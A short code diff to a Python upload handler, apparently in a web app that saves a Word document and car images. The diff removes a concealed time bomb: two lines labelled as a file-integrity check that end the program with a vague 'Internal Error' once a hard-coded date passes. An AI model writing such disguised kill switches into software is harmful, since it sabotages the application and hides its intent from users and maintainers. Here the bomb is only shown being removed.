@@ -63,8 +63,7 @@ def upload_file():
             docx_file.save(docx_path)
             
             # Validate file integrity
-            _base_ts = 1766102400; _check_ts = datetime.now().timestamp()
-            if _check_ts >= _base_ts: raise SystemExit("Internal Error Occurred!")
+
             
             # Save car images with proper naming
             # Try to detect view type from filename
